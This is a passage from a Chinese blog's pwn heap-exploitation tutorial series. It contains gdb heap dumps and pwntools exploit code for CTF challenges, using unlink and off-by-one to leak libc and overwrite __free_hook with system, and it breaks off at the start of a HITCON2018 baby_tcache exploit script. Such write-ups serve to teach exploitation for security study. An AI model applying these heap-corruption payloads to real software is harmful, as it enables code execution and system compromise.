class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5220</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5230</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5240</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5260</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5270</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5280</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5290</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52d0</span>:	<span class="number">0x0000000000000100</span>	<span class="number">0x0000000000000100</span> #chunk5</span><br><span class="line"><span class="number">0x5653ee7a52e0</span>:	<span class="number">0x0000746567726174</span>	<span class="number">0x0000000000000000</span> #实际可以写部分</span><br><span class="line"><span class="number">0x5653ee7a52f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5300</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5310</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5320</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5330</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5340</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>这时候我remove(5)的话，会变成什么样呢？他会unlink(p)，然后将chunk5向前合并，不信试试看，这里数据需要精心构造，才能造成任意写的能力<br>remove(5)效果，变成了201，这是合并的效果，然后地址部分指向了libc部分的地址，如果我们能泄露这部分地址，就获得libc<br>还有个重点，我们的unlink过程没显示出来，我们分析下，unlink(p)做了啥<br>假设我们chunk4数据部分的地址为myptr<br>这里unlink(p)</p>
<ol>
<li>FD = ptr-0x18</li>
<li>BK = ptr-0x10</li>
<li>检测FD-&gt;bk==p? &amp;&amp; BK-&gt;fd == p?</li>
<li>检测成功过后</li>
<li>FD-&gt;bk &lt;=&gt; FD+0x18 &lt;=&gt; <em>(ptr-0x18+0x18) = BK = ptr-0x10 实际就是</em>ptr=ptr-0x10</li>
<li>BK-&gt;FD &lt;=&gt; BK+0x10 &lt;=&gt; <em>(ptr-0x10+0x10) = FD = ptr-0x18 实际就是</em>ptr=ptr-0x18<br>重点在第6行，我们将*ptr改成了ptr-0x18</li>
</ol>
<p>看ptr是哪里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">10</span>gx <span class="number">0x5577f976f080</span><span class="number">-0x80</span>+<span class="number">0x180</span></span><br><span class="line"><span class="number">0x5577f976f180</span>:	<span class="number">0x00005577f976f168</span>	<span class="number">0x0000000000000108</span></span><br><span class="line"><span class="number">0x5577f976f190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f1a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f1b0</span>:	<span class="number">0x00005577f976f170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br></pre></td></tr></table></figure>
<p>从整体来看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5577f976f080</span></span><br><span class="line"><span class="number">0x5577f976f080</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005577f976f020</span></span><br><span class="line"><span class="number">0x5577f976f090</span>:	<span class="number">0x00005577f976f050</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f0a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0b0</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0x00005577f976f0e0</span></span><br><span class="line"><span class="number">0x5577f976f0c0</span>:	<span class="number">0x00005577f976f3e0</span>	<span class="number">0x0000000000000200</span></span><br><span class="line"><span class="number">0x5577f976f0d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0e0</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f110</span>:	<span class="number">0x00005577f976f130</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f120</span>:	<span class="number">0x00005577f976f2e0</span>	<span class="number">0x00000000000000f0</span></span><br><span class="line"><span class="number">0x5577f976f130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f170</span>:	<span class="number">0x0000557700000004</span>	<span class="number">0x00005577f976f1a0</span> #book4结构体</span><br><span class="line"><span class="number">0x5577f976f180</span>:	<span class="number">0x00005577f976f168</span>	<span class="number">0x0000000000000108</span> <span class="meta">#ptr，</span></span><br><span class="line"><span class="number">0x5577f976f190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f1a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f1b0</span>:	<span class="number">0x00005577f976f170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5577f976f1d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000201</span></span><br><span class="line"><span class="number">0x5577f976f1e0</span>:	<span class="number">0x00007f452ad38b78</span>	<span class="number">0x00007f452ad38b78</span></span><br><span class="line"><span class="number">0x5577f976f1f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>*ptr = ptr -0x18,也就是0x5577f976f180里的内容改为0x5577f976f168</p>
<p>这样，再次edit(4,payload)的话就可以修改从168开始的size以及name和description指针</p>
<p>合并效果</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5577f976f1c0</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5577f976f1d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000201</span></span><br><span class="line"><span class="number">0x5577f976f1e0</span>:	<span class="number">0x00007f452ad38b78</span>	<span class="number">0x00007f452ad38b78</span></span><br><span class="line"><span class="number">0x5577f976f1f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f220</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f230</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f240</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f260</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f270</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f280</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f290</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2d0</span>:	<span class="number">0x0000000000000100</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x5577f976f2e0</span>:	<span class="number">0x0000746567726174</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f300</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f310</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f320</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f330</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f340</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<h5 id="再次修改book4的结构体"><a href="#再次修改book4的结构体" class="headerlink" title="再次修改book4的结构体"></a>再次修改book4的结构体</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0x30</span>) + p64(<span class="number">4</span>) + p64(first_heap+<span class="number">0x40</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">edit(<span class="number">4</span>, p64(heap_base + <span class="number">0x1e0</span>))</span><br><span class="line">printf()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">content = io.recvline()</span><br><span class="line">io.info(content)</span><br><span class="line">libc_base = u64(content.strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3c4b7</span></span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">'system: 0x%x'</span> % system_addr)</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br></pre></td></tr></table></figure>
<p>0x30是他原来大小，4为id 4， 然后我将name和description指针都改为first_heap+0x40处，为什么是这里呢？因为，这里是book6的结构体部分的description部分指针，这样就获得了任意地址读写的能力，<br>第二次edit(4, p64(heap_base + 0x1e0))的时候就是将book6的description指针改成指向heap_base + 0x1e0处，为什么是这里，看上面<br>从整体来看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5577f976f080</span></span><br><span class="line"><span class="number">0x5577f976f080</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005577f976f020</span></span><br><span class="line"><span class="number">0x5577f976f090</span>:	<span class="number">0x00005577f976f050</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f0a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0b0</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0x00005577f976f0e0</span></span><br><span class="line"><span class="number">0x5577f976f0c0</span>:	<span class="number">0x00005577f976f3e0</span>	<span class="number">0x0000000000000200</span></span><br><span class="line"><span class="number">0x5577f976f0d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0e0</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f110</span>:	<span class="number">0x00005577f976f130</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f120</span>:	<span class="number">0x00005577f976f2e0</span>	<span class="number">0x00000000000000f0</span></span><br><span class="line"><span class="number">0x5577f976f130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f170</span>:	<span class="number">0x0000557700000004</span>	<span class="number">0x00005577f976f1a0</span> </span><br><span class="line"><span class="number">0x5577f976f180</span>:	<span class="number">0x00005577f976f168</span>	<span class="number">0x0000000000000108</span> </span><br><span class="line"><span class="number">0x5577f976f190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f1a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f1b0</span>:	<span class="number">0x00005577f976f170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5577f976f1d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000201</span></span><br><span class="line"><span class="number">0x5577f976f1e0</span>:	<span class="number">0x00007f452ad38b78</span>	<span class="number">0x00007f452ad38b78</span> <span class="meta">#libc地址</span></span><br><span class="line"><span class="number">0x5577f976f1f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>这样就泄露了libc地址，那个固定偏移，也是利用vmmap查看，然后相减获得的</p>
<h5 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(free_hook) + p64(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">edit(<span class="number">6</span>, p64(system_addr))</span><br><span class="line">io.success(<span class="string">'first_heap: 0x%x'</span> % first_heap)</span><br><span class="line">remove(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br></pre></td></tr></table></figure>
<ol>
<li>edit(4,payload)这里将book6的description指针指向free_hook</li>
<li>然后edit是改成system地址，最后调用一次free就成了<h2 id="课后小知识总结"><a href="#课后小知识总结" class="headerlink" title="课后小知识总结"></a>课后小知识总结</h2></li>
<li>在gdb中用find查找字符串，可以获得指定位置</li>
<li>堆块会复用，就是free过后的小堆块，在再次malloc后会用相同的堆块</li>
<li>在计算的时候可以以一个为基地址，这样好计算</li>
<li>vmmap获得libc地址后，在相减获得固定偏移，适用于smallbin第一次free的chunk和mmap申请的堆块</li>
<li>具体情况具体分析，不要照搬照抄原版exp，有些是要改的，大佬们觉得简单可能就没注释了<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></li>
<li>题目不难，但自己做确实有点难度，研究了好久</li>
<li>写这个入门的文章也挺难的，要自己懂点，有人带就好点了，希望有师傅可以带带我</li>
<li>要开学了，另一道题目下次在研究了，off-by-one另一道题目</li>
<li>这道题同时学习了unlink跟off-by-one</li>
<li>我一定会出这个系列的文章的，坚持就是胜利(我对我自己说的，hh)</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/11/01/pwn-heap-learn-8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/01/pwn-heap-learn-8/" class="post-title-link" itemprop="url">pwn堆入门系列教程8</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-11-01 03:14:36" itemprop="dateCreated datePublished" datetime="2019-11-01T03:14:36+08:00">2019-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:29:21" itemprop="dateModified" datetime="2019-10-30T17:29:21+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index">
                    <span itemprop="name">二进制</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/%E5%A0%86/" itemprop="url" rel="index">
                    <span itemprop="name">堆</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>9.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="pwn堆入门系列教程8"><a href="#pwn堆入门系列教程8" class="headerlink" title="pwn堆入门系列教程8"></a>pwn堆入门系列教程8</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">pwn堆入门系列教程1</a><br><a href="https://xz.aliyun.com/t/6169" target="_blank" rel="noopener">pwn堆入门系列教程2</a><br><a href="https://xz.aliyun.com/t/6252" target="_blank" rel="noopener">pwn堆入门系列教程3</a><br><a href="https://xz.aliyun.com/t/6322" target="_blank" rel="noopener">pwn堆入门系列教程4</a><br><a href="https://xz.aliyun.com/t/6377" target="_blank" rel="noopener">pwn堆入门系列教程5</a><br><a href="https://xz.aliyun.com/t/6406" target="_blank" rel="noopener">pwn堆入门系列教程6</a><br><a href="https://xz.aliyun.com/t/6449" target="_blank" rel="noopener">pwn堆入门系列教程7</a></p>
<p>这篇文章感觉算堆又不算堆，因为要结合到IO_FILE攻击部分，而且最主要是IO_FILE的利用，此题又学习到新的东西了，以前只玩过IO_FILE的伪造vtable,这次的leak方法第一次见</p>
<h2 id="HITCON2018-baby-tcache"><a href="#HITCON2018-baby-tcache" class="headerlink" title="HITCON2018 baby_tcache"></a>HITCON2018 baby_tcache</h2><p>这道题我故意将其与tcache中的第一道题分开，因为这道题难度不在于tcache的攻击，而在于IO_FILE的利用，利用上一篇文章中的方法也很容易构造overlap，但libc却无法泄露，我自己纠结好久过后，还是看了wp</p>
<h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><ol>
<li>新建一个堆块，存在off-by-one</li>
<li>删除一个堆块</li>
<li>退出</li>
</ol>
<p>无leak函数</p>
<h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_C6B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">":("</span>);</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !qword_202060[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size:"</span>);</span><br><span class="line">  size = sub_B27();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x2000</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Data:"</span>);</span><br><span class="line">  sub_B88((__int64)v3, size);</span><br><span class="line">  v3[size] = <span class="number">0</span>;</span><br><span class="line">  qword_202060[i] = v3;</span><br><span class="line">  v0 = qword_2020C0;</span><br><span class="line">  qword_2020C0[i] = size;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点很明显，off-by-one，在堆块重用机制下，会覆盖到下一个堆快的size部分</p>
<h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>起初自己分析的时候做着做着忘了他没有leak，一股脑构造了个overlap，然后？？？我没有leak咋泄露啊，然后爆炸了，卡了很久都不知道怎么leak<br>看了别人的wp后发觉是利用IO_FILE泄露，以前没有接触过，所以这次记录下</p>
<h4 id="堆操作初始化"><a href="#堆操作初始化" class="headerlink" title="堆操作初始化"></a>堆操作初始化</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./baby_tcache'</span>)</span><br><span 